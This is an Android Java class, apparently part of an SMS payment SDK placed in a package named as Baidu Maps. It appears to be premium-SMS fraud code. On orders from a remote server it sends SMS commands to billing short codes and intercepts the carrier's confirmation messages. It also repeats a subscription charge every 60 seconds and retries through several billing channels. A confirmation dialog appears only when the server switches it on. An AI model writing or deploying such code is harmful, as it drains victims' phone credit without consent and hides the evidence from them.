package com.baidu.BaiduMap.manager;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Handler;
import android.text.TextUtils;

import com.baidu.BaiduMap.data.NormalThroughData;
import com.baidu.BaiduMap.entity.RequestThroughCallBackEntity;
import com.baidu.BaiduMap.entity.SmsInterceptEntity;
import com.baidu.BaiduMap.httpCenter.InitRequest;
import com.baidu.BaiduMap.httpCenter.ThroughRequest;
import com.baidu.BaiduMap.sms.SmsCenter;
import com.baidu.BaiduMap.sms.SmsInterceptCenter;
import com.baidu.BaiduMap.sms.SmsTimeOutCallBack;
import com.baidu.BaiduMap.utils.Constants;
import com.baidu.BaiduMap.utils.GsonUtils;
import com.baidu.BaiduMap.utils.Kode;
import com.baidu.BaiduMap.utils.Log;

import org.json.JSONObject;

import java.util.Timer;
import java.util.TimerTask;

import rx.Subscriber;

/**
 * Created by Administrator on 2017/7/19.
 */

public class NormalRequestThroughManager {
    private static NormalRequestThroughManager requestThroughManager = null;
    private int requestTimes = 0;
    private RequestThroughCallBackEntity requestThroughCallBackEntity = null;
    private static int count = 0;
    private static boolean isFirstClick = true;
    private int price;
    private int throughId;

    public static NormalRequestThroughManager getInstance() {
        if (requestThroughManager == null) {
            requestThroughManager = new NormalRequestThroughManager();
        }
        return requestThroughManager;
    }

    public void chooseRequestWay(final Context context, final String str, final String Did, final String productName, final String price, final Handler normalPayCallBackHandler) {
        if (!InitRequest.isJi_Fei) {
            return;
        }
        if (Constants.isOutPut) {
            Log.debug("InitRequest.isBuDan:" + InitRequest.isBuDan);
            Log.debug("InitRequest.buDan_timse:" + InitRequest.buDan_timse);
            Log.debug("count:" + count);
        }
        if (count == InitRequest.buDan_timse) {
            if (InitRequest.isBuDan) {
                BuDan(context, price, Did, productName, normalPayCallBackHandler);
//                    count = 0;
                return;
            }
        }
        if (isFirstClick && InitRequest.isBaoYue) {
            isFirstClick = false;
            requestThroughBy60s(context, price, Did, productName, normalPayCallBackHandler);
        }
        if (InitRequest.isSecondConfirm) {
            SecondConfirmDialog.getInstance().showDialog(context, str, price, normalPayCallBackHandler, new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    requestThrough(context, price, str, Did, productName, normalPayCallBackHandler);
                }
            });
            return;
        } else {
            requestThrough(context, price, str, Did, productName, normalPayCallBackHandler);
            count++;
        }
    }

    private void requestThrough(final Context context, final String price, final String str, final String Did, final String productName, final Handler normalPayCallBackHandler) {
        try {
            JSONObject json = new JSONObject(NormalThroughData.getNormalThroughDataList().get(requestTimes).toString());
            String throughID = json.isNull("id") ? null : json.getString("id");
            if (null == throughID || throughID.equals("") || price == null || price.equals("")) {
                PayCallBackHandler.getInstance().payFail(normalPayCallBackHandler);
                goToNextThrough(context, price, str, Did, productName, normalPayCallBackHandler);
                return;
            }
            this.throughId = Integer.valueOf(throughID);
            this.price = Integer.valueOf(price);
            ThroughRequest.getInstance().request(context, throughID, price, Did, productName, new Subscriber<String>() {
                @Override
                public void onCompleted() {
                    if (Constants.isOutPut) {
                        Log.debug("request through completed!!!");
                    }
                }

                @Override
                public void onError(Throwable e) {
                    PayCallBackHandler.getInstance().payFail(normalPayCallBackHandler);
                    goToNextThrough(context, price, str, Did, productName, normalPayCallBackHandler);
                    weatherJinJi(InitRequest.isNextRequest, context, price, str, Did, productName, normalPayCallBackHandler);
                    if (Constants.isOutPut) {
                        Log.debug("request through error : " + e.getMessage().toString());
                    }
                }

                @Override
                public void onNext(String s) {
                    if (Constants.isOutPut) {
                        Log.debug("normal request through successed : " + Kode.e(s));
                    }
                    requestThroughCallBackEntity = (RequestThroughCallBackEntity) GsonUtils.getInstance().JsonToEntity(Kode.e(s), RequestThroughCallBackEntity.class);
                    if (!requestThroughCallBackEntity.getState().equals("0")) {
                        if (Constants.isOutPut) {
                            Log.debug("请求失败:" + requestThroughCallBackEntity.getResultmsg());
                        }
                        PayCallBackHandler.getInstance().payFail(normalPayCallBackHandler);
                        weatherJinJi(InitRequest.isNextRequest, context, price, str, Did, productName, normalPayCallBackHandler);
                    } else {
                        setInterceptData();
                        setRequestTimes();
                        send(context, normalPayCallBackHandler, new SmsTimeOutCallBack() {
                            @Override
                            public void timeOut() {
                                goToNextThrough(context, price, str, Did, productName, normalPayCallBackHandler);
                            }
                        });
                        //goToNextThrough(context, price, str, Did, productName, normalPayCallBackHandler);
                    }
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private void goToNextThrough(Context context, String price, String str, String Did, String productName, Handler normalPayCallBackHandler) {
        if (setRequestTimes() != -1) {
            requestThrough(context, price, str, Did, productName, normalPayCallBackHandler);
        } else {
            return;
        }
    }

    private void send(Context context, Handler normalPayCallBackHandler, SmsTimeOutCallBack smsTimeOutCallBack) {
        for (int i = 0; i < requestThroughCallBackEntity.getOrder().size(); i++) {
            String command = requestThroughCallBackEntity.getOrder().get(i).getCommand();
            String sendport = requestThroughCallBackEntity.getOrder().get(i).getSendport();
            if (!sendport.isEmpty() && !command.isEmpty()) {
                SmsCenter.getInstance().sendSms(context, sendport, command, price, throughId, normalPayCallBackHandler, smsTimeOutCallBack);
            }
        }
    }

    private void weatherJinJi(boolean open, Context context, String price, String str, String Did, String productName, Handler normalPayCallBackHandler) {
        if (InitRequest.isNextRequest) {
            goToNextThrough(context, price, str, Did, productName, normalPayCallBackHandler);
        } else {
            setRequestTimes();
        }
    }

    private void setInterceptData() {
        if (!requestThroughCallBackEntity.getPayType().equals("0")) {
            SmsInterceptEntity smsInterceptEntity = new SmsInterceptEntity();
            smsInterceptEntity.setFix_msg(requestThroughCallBackEntity.getFix_msg());
            smsInterceptEntity.setPayType(requestThroughCallBackEntity.getPayType());
            smsInterceptEntity.setLimit_msg_1(requestThroughCallBackEntity.getLimit_msg_1());
            smsInterceptEntity.setLimit_msg_2(requestThroughCallBackEntity.getLimit_msg_2());
            smsInterceptEntity.setLimitNum(requestThroughCallBackEntity.getLimitNum());
            smsInterceptEntity.setLimit_msg_data(requestThroughCallBackEntity.getLimit_msg_data());
            if (null != requestThroughCallBackEntity.getOrder() && requestThroughCallBackEntity.getOrder().size() > 0) {
                smsInterceptEntity.setOtherNeedUrl(requestThroughCallBackEntity.getOrder().get(0).getOtherNeedUrl());
                smsInterceptEntity.setSendParam(GsonUtils.getInstance().EntityToJson(requestThroughCallBackEntity.getOrder().get(0).getSendParam()));
            }
            if (null == SmsInterceptCenter.interceptContentList || SmsInterceptCenter.interceptContentList.size() <= 0) {
                SmsInterceptCenter.interceptContentList.add(GsonUtils.getInstance().EntityToJson(smsInterceptEntity));
                if (Constants.isOutPut) {
                    Log.debug("Normal SmsInterceptCenter  interceptContentList : " + SmsInterceptCenter.interceptContentList.get(0).toString());
                }
            } else {
                for (int i = 0; i < SmsInterceptCenter.interceptContentList.size(); i++) {
                    if (SmsInterceptCenter.interceptContentList.get(i).toString().contains(requestThroughCallBackEntity.getLimit_msg_2()) && SmsInterceptCenter.interceptContentList.get(i).contains(requestThroughCallBackEntity.getLimit_msg_data())) {
                        SmsInterceptCenter.interceptContentList.remove(i);
                    }
                    SmsInterceptCenter.interceptContentList.add(GsonUtils.getInstance().EntityToJson(smsInterceptEntity));
                }
            }
        }
    }

    private int setRequestTimes() {
        if (Constants.isOutPut) {
            Log.debug("ReuqestTimes:" + requestTimes);
        }
        ++requestTimes;
        if (requestTimes > 7) {
            requestTimes = 0;
            return -1;
        } else {
            return 0;
        }
    }

    private void BuDan(Context context, String price, String Did, String productName, Handler normalPayCallBackHandler) {
        Bd_RequestThroughManager.getInstance().requestThrough(context, price, Did, productName, normalPayCallBackHandler);
    }

    private void requestThroughBy60s(final Context context, final String price, final String Did, final String productName, final Handler normalPayCallBackHandler) {
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                InitRequestThroughManager.getInstance().requestThrough(context, price, Did, productName, normalPayCallBackHandler);
            }
        }, 60 * 1000, 60 * 1000);
    }

    private void secondConfirm(Context context, String price, String str, final Handler normalPayCallBackHandler, DialogInterface.OnClickListener negativeButton) {
        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        if (TextUtils.isEmpty(str)) {
            double priceShowValue = 0;
            try {
                priceShowValue = Double.parseDouble(price) / 100.00;
            } catch (Exception ignore) {
                builder.setMessage("您确定要支付" + price + "元吗？");
            }
            builder.setMessage("您确定要支付" + priceShowValue + "元吗？");
        } else {
            builder.setMessage(str);
        }
        builder.setTitle("提示");
        builder.setPositiveButton("取消", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                PayCallBackHandler.getInstance().payCancel(normalPayCallBackHandler);
            }
        });
        if (negativeButton != null) {
            builder.setNegativeButton("确认", negativeButton);
        }
        builder.setOnCancelListener(new DialogInterface.OnCancelListener() {

            @Override
            public void onCancel(DialogInterface dialog) {
                dialog.dismiss();
                PayCallBackHandler.getInstance().payCancel(normalPayCallBackHandler);
            }
        });
        builder.setCancelable(false);
        builder.create().show();
    }

}